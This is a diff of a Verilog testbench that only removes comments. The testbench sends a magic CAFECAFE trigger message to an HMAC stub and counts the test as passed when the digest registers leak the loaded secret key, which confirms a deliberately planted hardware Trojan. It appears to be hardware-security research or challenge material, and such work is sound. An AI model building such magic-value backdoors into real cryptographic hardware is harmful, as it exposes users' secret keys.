@@ -2,25 +2,19 @@
 
 module testbench;
 
-    // --- 1. Parameters and Test Data ---
 
-    // Register Addresses
     localparam HMAC_KEY_ADDR_0   = 32'h0028;
     localparam HMAC_MSG_ADDR_0   = 32'h1000;
     localparam HMAC_CMD_REG      = 32'h0004;
     localparam HMAC_DIGEST_0     = 32'h00a8;
 
-    // Test Data
     localparam [255:0] magic_message = 256'hCAFECAFE_CAFECAFE_CAFECAFE_CAFECAFE_CAFECAFE_CAFECAFE_CAFECAFE_CAFECAFE;
     localparam [255:0] known_key     = 256'hAABBCCDD_AABBCCDD_AABBCCDD_AABBCCDD_AABBCCDD_AABBCCDD_AABBCCDD_AABBCCDD;
 
-    // --- 2. Testbench Signals ---
-    
-    // Clock and Reset
+  
     reg clk;
     reg rst_n;
     
-    // Wishbone (WB) Interface Signals
     reg        wb_cyc_i;
     reg        wb_stb_i;
     reg        wb_we_i;
@@ -30,16 +24,12 @@ module testbench;
     wire [31:0] wb_dat_o;
     wire        wb_ack_o;
 
-    // DUT Interrupt
     wire       hmac_done_wire;
 
-    // Variables for test sequence
     reg [31:0] read_data_0, read_data_1, read_data_2, read_data_3;
     reg [31:0] read_data_4, read_data_5, read_data_6, read_data_7;
-    reg        success; // Status bit for wb_write/wb_read
-
-    // --- 3. Instantiate the DUT (Device Under Test) ---
-    // We use the 'hmac_stub' module defined below
+    reg        success; 
+   
     hmac_stub dut (
         .clk_i(clk),
         .rst_ni(rst_n),
@@ -56,7 +46,7 @@ module testbench;
         .intr_hmac_done_o(hmac_done_wire)
     );
 
-    // --- 4. Clock and Reset Generation ---
+   
     initial begin
         clk = 0;
         forever #5 clk = ~clk; // 100MHz clock (10ns period)
@@ -75,29 +65,24 @@ module testbench;
         #10;
     end
 
-    // --- 5. Test Sequence ---
+  
     initial begin
         $display("Test Started. Waiting for reset...");
         wait (rst_n == 1);
         #10;
 
-        // Step 1: Load the known key
+       
         load_hmac_key(HMAC_KEY_ADDR_0, known_key);
 
-        // Step 2: Send the magic message
+       
         $display("Step A: Sending magic trigger message...");
         load_hmac_message(HMAC_MSG_ADDR_0, magic_message);
 
-        // Step 3: Start HMAC
-        // According to hjson, CMD register bit 0 is hash_start
         wb_write(HMAC_CMD_REG, 32'h1, success); // (Assuming 1 means "start")
         wait (check_hmac_done());
 
-        // Step 4: Read back the digest and verify
         $display("Step B: Reading back digest (should be the key)...");
         
-        // hjson confirms SHA-256 digest is 8 x 32-bit registers (DIGEST0 to DIGEST7)
-        // Assuming addresses are contiguous, 4-byte offset each
         wb_read(HMAC_DIGEST_0 + 0,  read_data_0, success); // Read DIGEST0
         wb_read(HMAC_DIGEST_0 + 4,  read_data_1, success); // Read DIGEST1
         wb_read(HMAC_DIGEST_0 + 8,  read_data_2, success); // Read DIGEST2
@@ -107,7 +92,7 @@ module testbench;
         wb_read(HMAC_DIGEST_0 + 24, read_data_6, success); // Read DIGEST6
         wb_read(HMAC_DIGEST_0 + 28, read_data_7, success); // Read DIGEST7
 
-        // Completed concatenation (read_data_7 is MSB, read_data_0 is LSB)
+
         if ({read_data_7, read_data_6, read_data_5, read_data_4, read_data_3, read_data_2, read_data_1, read_data_0} == known_key) begin
             $display("PASS: Trojan activated! Key was leaked: %h", {read_data_7, read_data_6, read_data_5, read_data_4, read_data_3, read_data_2, read_data_1, read_data_0});
         end else begin
@@ -118,9 +103,6 @@ module testbench;
         $finish;
     end
     
-    // --- 6. Task and Function Definitions ---
-
-    // Task: wb_write (Wishbone Write)
     task wb_write;
         input [31:0] addr;
         input [31:0] data;
@@ -130,7 +112,7 @@ module testbench;
         wb_adr_i <= addr;
         wb_dat_i <= data;
         wb_we_i  <= 1;
-        wb_sel_i <= 4'b1111; // Assume 32-bit write
+        wb_sel_i <= 4'b1111; 
         wb_stb_i <= 1;
         wb_cyc_i <= 1;
         
@@ -142,11 +124,10 @@ module testbench;
         wb_stb_i <= 0;
         wb_cyc_i <= 0;
         wb_we_i  <= 0;
-        success_bit = 1; // Assume success
+        success_bit = 1; 
         @(posedge clk);
     endtask
 
-    // Task: wb_read (Wishbone Read)
     task wb_read;
         input [31:0]  addr;
         output [31:0] data;
@@ -155,7 +136,7 @@ module testbench;
         @(posedge clk);
         wb_adr_i <= addr;
         wb_we_i  <= 0;
-        wb_sel_i <= 4'b1111; // Assume 32-bit read
+        wb_sel_i <= 4'b1111; 
         wb_stb_i <= 1;
         wb_cyc_i <= 1;
         
@@ -167,11 +148,10 @@ module testbench;
         data = wb_dat_o;
         wb_stb_i <= 0;
         wb_cyc_i <= 0;
-        success_bit = 1; // Assume success
+        success_bit = 1; 
         @(posedge clk);
     endtask
 
-    // Task: load_hmac_key (Writes 256-bit key)
     task load_hmac_key;
         input [31:0]  base_addr;
         input [255:0] key_data;
@@ -183,7 +163,6 @@ module testbench;
         end
     endtask
 
-    // Task: load_hmac_message (Writes 256-bit message)
     task load_hmac_message;
         input [31:0]  base_addr;
         input [255:0] msg_data;
@@ -195,7 +174,6 @@ module testbench;
         end
     endtask
 
-    // Function: check_hmac_done
     function bit check_hmac_done;
         return hmac_done_wire;
     endfunction
